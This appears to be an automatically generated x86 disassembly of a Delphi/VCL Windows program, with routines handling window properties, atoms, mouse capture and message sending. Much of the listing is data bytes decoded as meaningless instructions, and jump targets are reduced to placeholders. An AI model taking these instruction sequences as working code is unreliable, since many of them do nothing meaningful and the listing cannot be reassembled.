imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ecx
add [ eax ] al
cmp al 0x5e
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ ebx + 0x43b6f4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
inc eax
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add ah al
adc [ eax + eax - 0x80 ] al
xor al [ eax ]
pushfd
xor al [ eax ]
mov dh ch
inc ebx
add [ ebp + ebx + 0x119c0044 ] ah
jo r-xdata
add [ esi + ebx * 2 ] bh
inc ebp
js r-xdata
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
insb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
dec esp
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov dh 0x43
add [ eax ] cl
lea eax [ eax ]
xchg esp eax
mov eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx - 0x44f3ffbd ] bh
inc ebx
add [ eax ] al
jbe r-xdata
add dh bh
mov edx 0x15c0043
outsb
je r-xdata
add al 0x8
push es
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
dec esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x13ffbc0f ] al
add [ eax - 0x5bffbc12 ] cl
sbb eax 0x119c0044
push eax
outsd
jae r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43bce4
loopne r-xdata
sub cl bl
inc ecx
add [ esp + ebp * 8 ] dl
inc ebx
add [ ecx + ebx * 8 + 0x41 ] bl
add al al
in al dx
inc ebx
add [ eax + ebx * 8 - 0x26bfffbf ] ch
inc ecx
add [ ecx + ebx * 8 - 0x14ffffbf ] dl
inc ebx
add [ edx + eax * 8 + 0x44 ] dl
add [ ebx + ebp * 8 + 0x43 ] dh
add [ edx + eax * 8 + 0x44 ] bh
add [ ecx - 0x1313ffbc ] dh
inc ebx
add [ eax - 0x33ffbc15 ] ch
retn 0x44
inc esp
add al ah
jmp r-xdata
je r-xdata
insd
dec ebx
popad
je r-xdata
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xbd3cc08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax ] bh
mov ebp 0x69090043
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec esp
outsd
ja r-xdata
outsd
outsb
or [ gs : edx + 0x76 ] esp
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
outsd
jo r-xdata
bound esp [ ebp + 0x54 ]
mov esi 0xa030043
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ esi + edi * 4 ] bh
inc ebx
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
mov ebp 0x62060043
jbe r-xdata
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
mov esi 0xb060043
push esp
inc edx
jbe r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ esi + edi * 4 ] edi
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60043be ] bl
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
mov esi 0xc08b0043
pushfd
mov esi 0xa030043
inc ebx
add [ ebx + 0x43be9cc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
cmp al 0xbe
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
inc edx
outsd
jb r-xdata
ror ah 0xbd
inc ebx
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
inc edx
jbe r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
fdivr [ ebp + 0xc010043 ]
push esp
or cl [ eax ]
push esp
dec ecx
insd
inc eax
rol [ ebx ] 0xd2
retn 0x43
outsd
insb
jae r-xdata
mov eax eax
loopne r-xdata
outsb
je r-xdata
inc ebx
outsd
add [ eax ] cl
aad 0x41
outsd
insb
jae r-xdata
shl al 0xbe
push esp
add ecx [ edx ]
inc ebx
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
inc eax
rol [ ebx ] 0xe4
retn 0x43
add bh bh
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
les esp [ ecx ]
inc esp
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
rol dl cl
inc ebx
add [ edx + eax ] al
add [ eax ] al
dec eax
mov eax 0xd8080043
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa444039b
outsd
inc esp
add al bl
aaa
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
fadd [ ecx ]
or ch dl
inc ecx
insb
push edi
sub_43c3b6
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ eax ] dh
cmove eax [ eax ]
in al dx
pop ds
inc esp
add [ ecx + eax + 0x1f80044 ] al
inc esp
add [ edx + esi * 8 + 0x43 ] ch
add al bl
add [ eax + eax - 0x8 ] eax
ja r-xdata
shl [ esp + eax * 8 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
lds eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
lds eax [ ebx ]
dec eax
lds eax [ ebx ]
or al 0x2
add [ eax ] al
sub al 0xbf
add [ ecx ] al
add [ edi ] cl
add [ eax + 0x77 ] dl
inc esp
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
jo r-xdata
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
add ah al
inc ebx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
dec esp
add [ eax + eax - 0x5c ] 0xd800446f
aaa
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
[ eax + eax - 0x48 ] 0x6a
inc esp
add ah dl
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
push esp
retn
sub_43c4d6
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ esi + edi + 0x1fec0044 ] ch
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax + 0x24 ] eax
xor eax [ eax + eax + 0x20 ]
inc esp
add [ eax + 0x34 ] dl
inc esp
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
add [ ecx + eax * 4 + 0x76740044 ] bl
adc [ eax + 0x44 ] al
je r-xdata
add [ esi + edi + 0x1fec0044 ] ch
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
dec esp
add [ eax + eax - 0x5c ] 0xd800446f
inc eax
add [ eax ] dl
inc eax
inc esp
insd
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax + 0x78cc0317 ]
inc esp
add ah dl
js r-xdata
add [ eax ] ah
inc esp
add [ eax + 0x34 ] dl
inc esp
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
add [ ecx + eax * 4 + 0x76740044 ] bl
inc esp
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax ] bh
jns r-xdata
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
add [ edx + esi - 0x7eb3ffc0 ] bl
inc esp
add [ edi + ebp * 2 + 0x37d80044 ] ah
outsd
insb
nop
pop esp
lds eax [ ebx ]
pop es
push cs
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 + 0x43 ] cl
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ edx + edi * 2 + 0x44 ] cl
add [ ebp + edi * 2 + 0x540b0044 ] bh
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
add [ eax + 0x7d ] dl
inc esp
add ah ah
jpe r-xdata
aaa
je r-xdata
cmp [ eax + eax + 0x68 ] eax
js r-xdata
inc esp
add [ eax ] bh
rcr ah 0xc6
inc ebx
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
int3
lds eax [ ebx ]
pop eax
lds eax [ ebx ]
or eax [ eax ]
outsd
ja r-xdata
add ah cl
jl r-xdata
add al bl
insd
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
outsb
je r-xdata
imul ebp [ esi + 0x64 ] 0xc5d0776f
mov ecx gs
xor eax esp
add [ eax ] al
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
outsd
insb
jae r-xdata
inc ebx
add [ eax - 0x3b ] bl
add ah dh
jl r-xdata
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
cld
ja r-xdata
insb
sbb eax 0xf1800044
inc ebx
add [ esp - 0x567ffbc ] cl
inc ebx
add [ eax ] ah
outsd
insb
je r-xdata
add [ ebx + 0x43c74cc0 ] cl
add [ eax ] al
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
add al ah
jns r-xdata
inc esp
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax - 0x7e ] cl
inc esp
add [ ecx ] al
add [ edi ] cl
add [ ecx + eax * 4 + 0x44 ] bh
add [ esi ] cl
push esp
inc ebx
jne r-xdata
inc ebx
add al ah
retn 0x43
or [ ebx + 0x6f ] al
sub_43c7f4
aam 0xc7
inc ebx
add dh bl
mov [ ebx ] sub_43c7e8
pop ecx
mov [ ebx ] r-xdata
imul eax edi 0xc7710043
inc ebx
add [ esi - 0x39 ] bh
inc ebx
add [ ebx - 0x67ffbc39 ] cl
mov [ ebx ] sub_43c7a5
mov dl 0xc7
inc ebx
add [ edi - 0x33ffbc39 ] bh
mov [ ebx ] 0x1
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffc7f4e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c0043c8 ] bl
enter 0x43 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
enter 0x43 0x78
add [ eax ] al
add [ edx + edx + 0x40 ] al
add [ eax ] dh
xor eax 0x59a80040
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi - 0x75b3ffc0 ] bl
inc esp
add [ eax + 0x1800448a ] ah
mov [ eax + eax + 0x28 ] es
mov [ eax + eax - 0x18 ] es
xchg ebx eax
inc esp
add al dl
xchg esi eax
inc esp
add [ eax ] dl
cdq
inc esp
add [ ebx + ebx * 4 ] dl
inc esp
add [ eax ] bl
mov al [ 0xffffffff9dcc0044 ]
inc esp
add ah ah
mov [ eax + eax - 0x54 ] al
xchg edi eax
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
js r-xdata
mov eax eax
sbb al 0xc9
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x52ffffc0 ] bl
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
cmp al 0x35
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x36 ] ah
inc ebx
add [ eax ] cl
add al [ eax ]
add [ edi + edi * 4 ] ch
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa4440d93
outsd
inc esp
add al bl
aaa
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
les esp [ ecx ]
inc esp
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
nop
jo r-xdata
add [ ecx + ecx * 8 ] bl
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x36 ] bh
sub_43c9d2
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ esi + edi + 0x1fec0044 ] ch
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax + 0x24 ] eax
xor eax [ eax + eax + 0x20 ]
inc esp
add [ eax + 0x34 ] dl
inc esp
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
and al 0x9f
cld
[ ecx + 0x40000000 ]
je r-xdata
push eax
call GetWindowLongA
test eax 0x40000000
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
je r-xdata
insb
nop
js r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
inc eax
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
and al 0x2b
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
or [ eax - 0x18 ] dl
out 0xa0 eax
cld
jmp [ ecx + rw-data ]
insb
jo r-xdata
add [ eax ] dl
mov ah 0x44
add [ ebx + ebp ] ah
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc ebx
add al ah
retn 0x43
sub_43cb5c
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43cb90
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43cb5c
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43cbec
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43cdd0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c484
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404558
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ce14
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c484
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404558
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ce80
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov eax ebx
call sub_4464d0
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43cf1a
inc ebx
add ah al
je sub_43cf60
add [ ecx ] cl
push esp
push ebx
imul esi [ ebp + 0x4c ] 0x8b747369
rcl [ ebx + 0x56 ] 0x57
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_417570
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43cf2c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_417570
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43cf60
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43cf88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_40276c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43cf60
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43cf2c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_417414
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4175ec
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cfe4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_417448
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417570
mov edx 0x8
